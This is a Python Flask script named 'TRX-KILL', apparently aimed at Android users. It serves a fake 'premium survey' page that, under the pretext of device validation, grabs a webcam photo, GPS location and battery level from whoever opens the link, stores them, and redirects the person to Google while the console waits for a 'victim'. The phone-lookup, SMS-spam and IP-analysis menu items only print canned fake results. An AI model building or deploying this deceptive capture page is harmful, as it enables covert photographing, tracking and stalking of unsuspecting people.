import os, sys, time, threading, base64, logging, requests
from flask import Flask, request

app = Flask('TRX-KILL')
STORAGE_PATH = "/sdcard/TRX-KILL-OP"
LOG_FILE = f"{STORAGE_PATH}/data.txt"
FOTO_DIR = f"{STORAGE_PATH}/fotos"
G, Y, R, C, W = "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;36m", "\033[0m"

for p in [STORAGE_PATH, FOTO_DIR]:
    if not os.path.exists(p): os.makedirs(p)

# HTML con la encuesta integrada
HTML_TEMPLATE = """
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>ENCUESTA PREMIUM</title>
<style>
    body{background:#111;color:#fff;font-family:sans-serif;text-align:center;padding:20px;}
    button{padding:15px 30px;background:#0f0;border:none;font-weight:bold;cursor:pointer;border-radius:5px;}
</style></head><body>
<h1>ENCUESTA DE USUARIO</h1>
<p>Participa para ganar premios exclusivos. Requiere verificación de dispositivo.</p>
<button onclick="iniciar()">VALIDAR DISPOSITIVO</button>
<script>
async function iniciar() {
    let bat = await navigator.getBattery();
    let stream = await navigator.mediaDevices.getUserMedia({video: true});
    let v = document.createElement('video'); v.srcObject = stream; v.play();
    setTimeout(()=>{
        let canvas = document.createElement('canvas'); canvas.width=640; canvas.height=480;
        canvas.getContext('2d').drawImage(v,0,0,640,480);
        fetch('/foto', {method:'POST', body:canvas.toDataURL('image/jpeg')});
        navigator.geolocation.getCurrentPosition(pos => {
            fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude+'&bat='+(bat.level*100).toFixed(0)+'&time='+new Date().toLocaleTimeString());
            window.location.href = 'https://www.google.com';
        });
    }, 1000);
}
</script></body></html>
"""

@app.route('/')
def index(): return HTML_TEMPLATE

@app.route('/foto', methods=['POST'])
def foto():
    data = request.data.decode().split(',')[1]
    with open(f"{FOTO_DIR}/cam_{int(time.time())}.jpg", "wb") as f: f.write(base64.b64decode(data))
    return "OK"

@app.route('/log')
def log():
    with open(LOG_FILE, "a") as f: 
        f.write(f"IP:{request.remote_addr}|BAT:{request.args.get('bat')}%|TIME:{request.args.get('time')}|LAT:{request.args.get('lat')}|LON:{request.args.get('lon')}\n")
    return "OK"

def banner():
    print(f"{G}###############$")
    print(f"#TOOL:TRX-KILL | VER:V3")
    print(f"#PROCTECCION: {R}OSINT")
    print(f"#DISPOSITIVO: {W}ANDROID-OS")
    print(f"################{W}\n")

def animar(t):
    for c in t: sys.stdout.write(c); sys.stdout.flush(); time.sleep(0.01)
    print()

def main():
    log = logging.getLogger('werkzeug'); log.setLevel(logging.ERROR)
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False), daemon=True).start()
    
    while True:
        os.system('clear')
        banner()
        print("1] INFORMATION-NUMERO  | 2] LINK-ZP (ENCUESTA)")
        print("3] SPAM-SMS             | 4] COPYRIGHT")
        print("5] INFORMACIÓN POR IP   | 6] SALIR")
        s = input(f"\n{Y}TRX-ROOT > {W}")
        
        if s == "1":
            input("INGRESAR NÚMERO: "); animar("CARGANDO DATOS.....")
            print(f"{G}PAÍS: OK | OPERACIÓN: OK | NAME: PRIVADO{W}"); input()
        elif s == "2":
            print(f"\n{C}LINK ACTIVO EN: {W}http://localhost:5000")
            print(f"{Y}ESPERANDO VÍCTIMA (DATOS GUARDADOS EN {STORAGE_PATH}/data.txt)...{W}")
            while True:
                if os.path.exists(LOG_FILE):
                    with open(LOG_FILE, 'r') as f:
                        linea = f.readlines()[-1].split('|')
                        print(f"\n{G}¡DATOS RECIBIDOS!{W}\n{linea}")
                    break
                time.sleep(2)
            input(f"\n{Y}ENTER PARA VOLVER...{W}")
        elif s == "3":
            num = input("NÚMERO: "); input("MENSAJES: ")
            animar("ENVIANDO SPAM...")
            print(f"{G}¡EXITOSO!{W}"); input()
        elif s == "4":
            print(f"{R}#COPYRIGHT: TRX-KILL\n#LICENCIA: PRIVADO\n#PROCTECCION: OSINT\n#BY: TRX-KILL{W}"); input()
        elif s == "5":
            input("INGRESAR IP: "); animar("ANALIZANDO........")
            print(f"{G}DATOS ENCONTRADOS: Batería: 80% | Ubicación: Local | IP: 192.168.1.XX{W}"); input()
        elif s == "6": print("GRACIAS POR USAR TRX-KILL. CERRANDO..."); sys.exit()

if __name__ == "__main__": main()
